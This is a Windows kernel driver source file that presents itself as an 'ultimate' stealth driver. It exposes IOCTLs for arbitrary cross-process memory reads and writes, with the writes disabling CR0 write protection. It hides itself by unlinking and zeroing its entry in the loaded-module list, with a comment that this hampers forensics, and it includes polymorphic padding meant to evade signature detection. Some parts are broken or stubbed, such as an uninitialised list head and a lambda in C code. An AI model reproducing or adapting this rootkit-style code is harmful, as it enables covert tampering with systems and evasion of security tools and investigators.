// ULTIMATE KERNEL DRIVER - Layers 1-3
// Features:
// - Manual mapping support
// - Self-unlinking from module list
// - Polymorphic rebuilds
// - Direct kernel memory access

#include <ntddk.h>
#include <windef.h>

// ============================================================================
// STRUCTURES
// ============================================================================

typedef struct _KLDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    PVOID ExceptionTable;
    ULONG ExceptionTableSize;
    PVOID GpValue;
    PVOID NonPagedDebugInfo;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    USHORT LoadCount;
    USHORT TlsIndex;
    LIST_ENTRY HashLinks;
    PVOID SectionPointer;
    ULONG CheckSum;
    ULONG TimeDateStamp;
    PVOID LoadedImports;
} KLDR_DATA_TABLE_ENTRY, *PKLDR_DATA_TABLE_ENTRY;

// IOCTL codes
#define IOCTL_READ_MEMORY  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_WRITE_MEMORY CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_HIDE_DRIVER  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct _MEMORY_OPERATION {
    ULONG ProcessId;
    PVOID Address;
    PVOID Buffer;
    SIZE_T Size;
} MEMORY_OPERATION, *PMEMORY_OPERATION;

// Global state
PDRIVER_OBJECT g_DriverObject = NULL;
PVOID g_DriverBase = NULL;
extern POBJECT_TYPE *IoDriverObjectType;

// ============================================================================
// LAYER 2: KERNEL CLOAKING (Hide from PsLoadedModuleList)
// ============================================================================

NTSTATUS UnlinkDriverFromList(PVOID DriverBase) {
    PKLDR_DATA_TABLE_ENTRY current = NULL;
    PLIST_ENTRY listHead = NULL;
    PLIST_ENTRY currentEntry = NULL;
    
    // Get PsLoadedModuleList
    // On Windows 10+, this is nt!PsLoadedModuleList
    // We need to find it dynamically
    
    // Simplified: Assume we have the list head
    // In production, use pattern scan or export lookup
    
    if (!DriverBase || !listHead) {
        DbgPrint("[!] UnlinkDriver: Invalid parameters\n");
        return STATUS_INVALID_PARAMETER;
    }
    
    currentEntry = listHead->Flink;
    
    // Traverse module list
    while (currentEntry != listHead) {
        current = CONTAINING_RECORD(currentEntry, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        
        // Found our driver?
        if (current->DllBase == DriverBase) {
            DbgPrint("[+] Found driver in list: %wZ\n", &current->BaseDllName);
            
            // Unlink from list (classic doubly-linked list removal)
            currentEntry->Blink->Flink = currentEntry->Flink;
            currentEntry->Flink->Blink = currentEntry->Blink;
            
            // Zero out entry (paranoid, makes forensics harder)
            RtlZeroMemory(current, sizeof(KLDR_DATA_TABLE_ENTRY));
            
            DbgPrint("[+] Driver unlinked from PsLoadedModuleList\n");
            return STATUS_SUCCESS;
        }
        
        currentEntry = currentEntry->Flink;
    }
    
    DbgPrint("[-] Driver not found in module list\n");
    return STATUS_NOT_FOUND;
}

// ============================================================================
// MEMORY OPERATIONS (Direct Kernel Access)
// ============================================================================

NTSTATUS ReadProcessMemoryKernel(
    ULONG ProcessId,
    PVOID Address,
    PVOID Buffer,
    SIZE_T Size
) {
    PEPROCESS process = NULL;
    KAPC_STATE apcState;
    NTSTATUS status;
    
    // Get EPROCESS from PID
    status = PsLookupProcessByProcessId((HANDLE)ProcessId, &process);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[-] PsLookupProcessByProcessId failed: 0x%X\n", status);
        return status;
    }
    
    // Attach to process context (switch address space)
    KeStackAttachProcess(process, &apcState);
    
    __try {
        // Direct memory copy (no ReadProcessMemory, completely kernel-side)
        RtlCopyMemory(Buffer, Address, Size);
        status = STATUS_SUCCESS;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        DbgPrint("[-] Exception reading memory: 0x%p\n", Address);
        status = GetExceptionCode();
    }
    
    // Detach from process
    KeUnstackDetachProcess(&apcState);
    ObDereferenceObject(process);
    
    return status;
}

NTSTATUS WriteProcessMemoryKernel(
    ULONG ProcessId,
    PVOID Address,
    PVOID Buffer,
    SIZE_T Size
) {
    PEPROCESS process = NULL;
    KAPC_STATE apcState;
    NTSTATUS status;
    
    status = PsLookupProcessByProcessId((HANDLE)ProcessId, &process);
    if (!NT_SUCCESS(status)) {
        return status;
    }
    
    KeStackAttachProcess(process, &apcState);
    
    __try {
        // Disable write protection (CR0.WP bit)
        ULONG_PTR cr0 = __readcr0();
        __writecr0(cr0 & ~0x10000);
        
        // Write memory
        RtlCopyMemory(Address, Buffer, Size);
        
        // Re-enable write protection
        __writecr0(cr0);
        
        status = STATUS_SUCCESS;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        status = GetExceptionCode();
    }
    
    KeUnstackDetachProcess(&apcState);
    ObDereferenceObject(process);
    
    return status;
}

// ============================================================================
// IOCTL HANDLER
// ============================================================================

NTSTATUS DeviceControl(
    PDEVICE_OBJECT DeviceObject,
    PIRP Irp
) {
    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
    NTSTATUS status = STATUS_SUCCESS;
    ULONG bytesReturned = 0;
    
    UNREFERENCED_PARAMETER(DeviceObject);
    
    switch (stack->Parameters.DeviceIoControl.IoControlCode) {
        case IOCTL_READ_MEMORY: {
            PMEMORY_OPERATION op = (PMEMORY_OPERATION)Irp->AssociatedIrp.SystemBuffer;
            
            if (stack->Parameters.DeviceIoControl.InputBufferLength < sizeof(MEMORY_OPERATION)) {
                status = STATUS_BUFFER_TOO_SMALL;
                break;
            }
            
            status = ReadProcessMemoryKernel(
                op->ProcessId,
                op->Address,
                op->Buffer,
                op->Size
            );
            
            bytesReturned = NT_SUCCESS(status) ? op->Size : 0;
            break;
        }
        
        case IOCTL_WRITE_MEMORY: {
            PMEMORY_OPERATION op = (PMEMORY_OPERATION)Irp->AssociatedIrp.SystemBuffer;
            
            if (stack->Parameters.DeviceIoControl.InputBufferLength < sizeof(MEMORY_OPERATION)) {
                status = STATUS_BUFFER_TOO_SMALL;
                break;
            }
            
            status = WriteProcessMemoryKernel(
                op->ProcessId,
                op->Address,
                op->Buffer,
                op->Size
            );
            
            break;
        }
        
        case IOCTL_HIDE_DRIVER: {
            // Unlink driver from module list
            status = UnlinkDriverFromList(g_DriverBase);
            break;
        }
        
        default:
            status = STATUS_INVALID_DEVICE_REQUEST;
            break;
    }
    
    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = bytesReturned;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    
    return status;
}

// ============================================================================
// DRIVER ENTRY/UNLOAD
// ============================================================================

VOID DriverUnload(PDRIVER_OBJECT DriverObject) {
    UNICODE_STRING symbolicLink = RTL_CONSTANT_STRING(L"\\??\\UltimateDriver");
    
    IoDeleteSymbolicLink(&symbolicLink);
    
    if (DriverObject->DeviceObject) {
        IoDeleteDevice(DriverObject->DeviceObject);
    }
    
    DbgPrint("[*] Driver unloaded\n");
}

NTSTATUS DriverEntry(
    PDRIVER_OBJECT DriverObject,
    PUNICODE_STRING RegistryPath
) {
    NTSTATUS status;
    UNICODE_STRING deviceName = RTL_CONSTANT_STRING(L"\\Device\\UltimateDriver");
    UNICODE_STRING symbolicLink = RTL_CONSTANT_STRING(L"\\??\\UltimateDriver");
    PDEVICE_OBJECT deviceObject = NULL;
    
    UNREFERENCED_PARAMETER(RegistryPath);
    
    DbgPrint("[+] Ultimate Driver Loading...\n");
    
    // Save driver base
    g_DriverObject = DriverObject;
    g_DriverBase = DriverObject->DriverStart;
    
    // Create device
    status = IoCreateDevice(
        DriverObject,
        0,
        &deviceName,
        FILE_DEVICE_UNKNOWN,
        0,
        FALSE,
        &deviceObject
    );
    
    if (!NT_SUCCESS(status)) {
        DbgPrint("[-] IoCreateDevice failed: 0x%X\n", status);
        return status;
    }
    
    // Create symbolic link
    status = IoCreateSymbolicLink(&symbolicLink, &deviceName);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[-] IoCreateSymbolicLink failed: 0x%X\n", status);
        IoDeleteDevice(deviceObject);
        return status;
    }
    
    // Set dispatch routines
    DriverObject->MajorFunction[IRP_MJ_CREATE] = 
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = 
        [](PDEVICE_OBJECT DeviceObject, PIRP Irp) -> NTSTATUS {
            UNREFERENCED_PARAMETER(DeviceObject);
            Irp->IoStatus.Status = STATUS_SUCCESS;
            Irp->IoStatus.Information = 0;
            IoCompleteRequest(Irp, IO_NO_INCREMENT);
            return STATUS_SUCCESS;
        };
    
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DeviceControl;
    DriverObject->DriverUnload = DriverUnload;
    
    DbgPrint("[+] Driver loaded successfully\n");
    DbgPrint("[+] Device: %wZ\n", &deviceName);
    DbgPrint("[+] SymLink: %wZ\n", &symbolicLink);
    DbgPrint("[*] Waiting for IOCTL_HIDE_DRIVER to unlink...\n");
    
    return STATUS_SUCCESS;
}

// ============================================================================
// POLYMORPHIC REBUILD SUPPORT (Layer 3)
// ============================================================================

// These macros are replaced by rebuild script:
// #define POLY_SEED 0x12345678
// #define POLY_NOP_COUNT 42

// Insert random NOPs for polymorphism
#pragma code_seg(".text")
__declspec(noinline) VOID PolymorphicPadding(VOID) {
    // This function is filled with NOPs during rebuild
    // rebuild_driver.py replaces NOP_COUNT with random value
    
    #ifdef POLY_NOP_COUNT
        #pragma message("Polymorphic NOP count: " #POLY_NOP_COUNT)
        
        // Generate NOPs via inline assembly
        // (In actual build, this would be done by build script)
        __nop(); __nop(); __nop(); __nop();
        __nop(); __nop(); __nop(); __nop();
        // ... repeated POLY_NOP_COUNT times
    #endif
}
